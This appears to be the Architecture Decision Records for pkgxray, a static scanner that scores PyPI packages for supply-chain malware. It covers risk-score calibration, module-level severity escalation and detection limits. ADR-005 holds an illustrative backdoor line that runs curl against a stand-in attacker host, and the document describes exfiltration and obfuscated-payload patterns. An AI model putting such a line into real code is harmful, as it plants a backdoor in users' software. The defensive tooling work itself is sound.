# Architecture Decision Records — pkgxray

ADRs document significant design decisions: what was decided, why, and what the trade-offs are. Update this file when a decision changes.

**Format:** Each ADR has a status (`Accepted` | `Superseded` | `Proposed`) and a date.

---

## ADR-001: Static AST Analysis — No Code Execution

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
All analysis is performed via `ast.parse()` on the raw source text. The package under analysis is never imported, executed, or installed.

### Rationale
- Executing arbitrary third-party code is the threat model we are defending against. Running the code to analyse it would be self-defeating.
- `ast.parse()` is safe: it parses syntax only, never evaluates semantics.
- The only network activity is the PyPI metadata fetch and archive download — both using `urllib` from the stdlib.

### Consequences
- We can only detect patterns that are visible in source code (not in compiled `.so`/`.pyd` extensions).
- Packages that gate malicious behaviour behind runtime conditions can evade detection.
- Aliased names (`import subprocess as sp`) are not tracked across statements.

---

## ADR-002: urllib-Only HTTP Client

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
`downloader.py` uses only `urllib.request` from the Python standard library. No `requests`, `httpx`, or other third-party HTTP libraries.

### Rationale
- Minimises the dependency surface of a security tool. Adding `requests` would mean pkgxray itself is subject to the same supply-chain risks it analyses.
- `urllib` is sufficient for the two API calls needed (PyPI JSON endpoint + archive download).

### Consequences
- No retry logic, connection pooling, or timeout configuration beyond what `urllib` exposes.
- SSL certificate verification relies on the system's default CA bundle via `urllib`.
- Adding proxy support or custom TLS would require more verbose code.

---

## ADR-003: Fail-Open Per Analyser

**Status:** Accepted — updated v0.3.0
**Date:** 2024 (initial design) · Updated 2026 (v0.3.0)

### Decision
Every `analyzer.analyze()` call in the orchestrator is wrapped in `try/except Exception: continue`. A crash in one analyser never aborts the rest of the scan.

### Rationale
- A maliciously crafted package that exploits a bug in one analyser should not be able to suppress findings from the other seven.
- A parse error in an unusual Python file (e.g. using Python 3.13+ syntax on a 3.9 runner) should degrade gracefully, not crash the tool.

### Consequences
- ~~Analyser bugs are silently swallowed unless tests catch them.~~
- **v0.3.0 update (P4-04):** The silent `continue` was replaced by `logger.warning(analyzer_name, filename, error)`. Users can enable visibility with `--verbose` (CLI) or `logging.basicConfig(level=logging.DEBUG)` (API). Fail-open behaviour is preserved.
- Failures remain non-fatal by design (ADR-003 unchanged); only observability improved.

---

## ADR-004: Two-Level Score Capping with Per-Analyser Caps and Combo Bonuses

**Status:** Accepted
**Date:** 2025 (v0.3.0 recalibration)

### Decision

The risk score uses three layers of control:

1. **Per-analyser caps (variable):** Each analyser has its own ceiling based on how often it fires on legitimate packages.
2. **Combo bonuses:** When multiple high-risk categories appear together with ≥ HIGH severity, a bonus is added to reflect combined danger (e.g. reading credentials AND making a network call).
3. **Global cap (100 points):** Total score is clamped to 100.

Severity weights (unchanged): LOW=1, MEDIUM=3, HIGH=7, CRITICAL=15.

**Per-analyser caps (v0.3.0):**

| Analyser | Cap | Rationale |
|---|---|---|
| `obfuscation` | 20 | exec(b64decode) — almost never legitimate |
| `setup_scripts` | 20 | Install hooks — high-confidence attack vector |
| `code_exec` | 15 | eval/exec — suspicious but used in templating |
| `subprocess` | 12 | Common in build tools and CLI wrappers |
| `filesystem` | 12 | Destructive ops + sensitive paths |
| `network` | 8 | Normal for HTTP libraries |
| `dynamic_imports` | 6 | Used in legitimate plugin systems |
| `env_access` | 5 | Ubiquitous in CLI tools and 12-factor apps |

**Risk level thresholds (v0.3.0):**

| Score | Level |
|---|---|
| 0 – 15 | LOW |
| 16 – 35 | MODERATE |
| 36 – 60 | HIGH |
| 61 – 100 | CRITICAL |

**Combo bonuses — minimum severity gate (post v0.3.0 calibration):**

| Combo | Bonus | Min severity required | Meaning |
|---|---|---|---|
| `env_access` + `network` | +25 | **CRITICAL** (both sides) | Credential exfiltration pattern |
| `network` + `subprocess` | +10 | HIGH (both sides) | Download and execute pattern |
| `obfuscation` + `code_exec` | +20 | HIGH (both sides) | Obfuscated payload pattern |
| `setup_scripts` + `subprocess` | +10 | HIGH (both sides) | Install hook with shell commands |

**Why `env_access + network` requires CRITICAL:** Legitimate cloud SDKs (boto3, stripe-python, google-cloud-*) read credential env vars inside functions (HIGH severity) and make HTTPS calls (HIGH severity). The original HIGH gate caused these packages to score HIGH — a false positive. The attack pattern we target is *module-level* credential theft that auto-executes at import time; module-level findings already escalate to CRITICAL via ADR-005. Requiring CRITICAL from both sides restricts the combo to the true attack pattern without penalising legitimate SDKs.

### Rationale

The original single cap of 20 across all analysers was too permissive: any package touching 5+ analysers at any severity reached CRITICAL. Empirical baseline scans showed:
- `requests` (legitimate HTTP library) was scoring HIGH due to network + env + filesystem findings.
- `click` (CLI framework) was scoring HIGH due to env + subprocess findings.

Per-analyser caps reduce the weight of frequently-firing low-risk patterns (env reads, network calls) without discarding the information entirely. High-confidence analysers (`obfuscation`, `setup_scripts`) retain higher ceilings.

Combo bonuses add signal for multi-category packages: a package that BOTH exfiltrates credentials AND makes network calls is more dangerous than the sum of either alone.

### Consequences

- `requests` → MODERATE (~31); `click` → MODERATE (~29); `more-itertools` → LOW (~0).
- A package with `exec(b64decode(...))` + install hook + module-level subprocess → CRITICAL.
- Caps and thresholds should be re-evaluated after Phase 2 analyser fixes (false-positive reductions) are merged, as those will change raw finding counts.

---

## ADR-005: Severity Escalation at Module Level

**Status:** Accepted — gap fixed in v0.3.0
**Date:** 2024 (initial design) · Fixed 2026 (v0.3.0, P2-04 + P2-05)

### Decision
Any dangerous call (subprocess, network, code execution, dynamic import, env access, filesystem destructive op) that appears at the top level of a module — or in a class body — is automatically escalated to `CRITICAL` severity, regardless of its base severity.

### Rationale
- Module-level code runs automatically when the package is imported, requiring no further user action beyond installation.
- Class-body code also runs at class-definition time, which happens at import time for top-level classes. The risk is identical to bare module-level code.
- This is the canonical attack pattern in PyPI supply-chain attacks.

### v0.3.0 Fix (P2-04)
`is_module_level()` previously returned `False` for nodes inside a `ClassDef`, missing class-body attacks:

```python
class Backdoor:
    subprocess.run(["curl", "http://evil.com"])  # now correctly → CRITICAL
```

`ClassDef` was removed from the barrier set. Only `FunctionDef` and `AsyncFunctionDef` return `False`.

### v0.3.0 Extension (P2-05)
Module-level escalation extended to three previously uncovered analysers:
- `filesystem.py` — destructive calls (`remove`, `unlink`, `rmtree`) at module level → CRITICAL
- `env_access.py` — sensitive env reads (HIGH/MEDIUM) at module level → CRITICAL; LOW stays LOW
- `dynamic_imports.py` — `__import__` / `importlib.import_module` at module level → CRITICAL

### Remaining Limitation
Code inside methods of module-level classes correctly stays at its base severity when inside a method body (`FunctionDef` is still a barrier). This is correct behaviour.

---

## ADR-006: Docker as the Canonical Test Environment

**Status:** Accepted
**Date:** 2025 (v0.2.x)

### Decision
All tests in CI run inside Docker. The Docker image is the single source of truth for the test environment. Local development should also use `docker compose run test` for PR validation.

### Rationale
- The team uses different local Python versions. Docker ensures everyone and CI runs the same interpreter.
- The Dockerfile pins `python:3.11-slim` as the primary test target, with the CI matrix also covering 3.9 and 3.12.
- Reproducibility: a test that passes in Docker will pass in CI.

### Consequences
- Slower first run (image build). Subsequent runs use Docker's layer cache.
- Developers need Docker installed. Lightweight alternatives (e.g. podman) are compatible.
- Integration tests that download real packages from PyPI require network access in the Docker container.

---

## ADR-007: Receiver-Name-Based False-Positive Mitigation

**Status:** Accepted — partially effective
**Date:** 2024 (initial design)

### Decision
Analysers that detect method calls check the *receiver* object's name before flagging. For example, `NetworkAnalyzer` only flags `.get()` calls when the receiver is in `{"requests", "httpx", "session", "client", ...}`, preventing `dict.get()` and `config.get()` from being flagged.

### Rationale
- Pure regex scanning produces an unacceptable number of false positives for common method names.
- The AST gives us the receiver as an `ast.Name` node, which we can inspect.

### v0.3.0 Fix (P2-02)
`_extract_receiver_name()` helper added to `network.py`. It resolves chained attribute chains by returning the innermost attribute name:

```python
# Before: self.session.get(url) → receiver="" → NOT flagged
# After:  self.session.get(url) → receiver="session" → "session" ∈ _KNOWN_HTTP_RECEIVERS → HIGH
```

Applied to HTTP method detection and `connect()` DB-exclusion logic.

### v0.3.0 Extension (P2-01)
Receiver filtering extended to `filesystem.py` for `remove` and `unlink`:
- `list.remove(x)` / `set.remove(x)` → no longer false positives
- `os.remove(f)` / `Path("f").unlink()` → still flagged (receiver ∈ `{os, pathlib, Path}`)
- `shutil.rmtree(d)` → always flagged (unambiguous, no receiver check needed)

### Remaining Limitation
Aliased receivers are still not tracked across statements:

```python
import requests as r
r.get(url)  # receiver "r" not in _KNOWN_HTTP_RECEIVERS → missed (out of scope v0.3)
```

---

## ADR-008: Binary Extension Analysis — Out of Scope for v0.3

**Status:** Proposed — deferred to future version
**Date:** 2026 (v0.3.0 research)

### Context
PyPI packages often include compiled extensions (`.so` on Linux/macOS, `.pyd` on Windows). These are binary files that `ast.parse()` cannot read. A malicious actor could place an attack payload entirely inside a compiled extension and pkgxray would not detect it.

### Decision
Binary analysis is explicitly out of scope for v0.3.0. pkgxray only analyses Python source files.

### Rationale
- Binary analysis requires platform-specific disassembly tooling (e.g. `objdump`, `otool`, `dumpbin`) or a Python library like `lief` or `pyelftools`, which would violate the minimal-dependency principle (ADR-002).
- The primary attack vectors observed in PyPI supply-chain incidents (2022–2025) overwhelmingly use Python source code — in `setup.py`, `__init__.py`, or inline modules — not compiled extensions.
- A future `binary_extensions` analyser could flag packages that include `.so`/`.pyd` files and optionally check their imported symbols for suspicious names (e.g. `system`, `execve`, `socket`).

### Consequences
- Packages that hide malicious logic entirely in compiled extensions will not be flagged.
- The scan result's `skipped_files` list already captures files that could not be analysed, providing transparency.
- This limitation is documented in Section 8 (Assumption #3) of the project instructions.
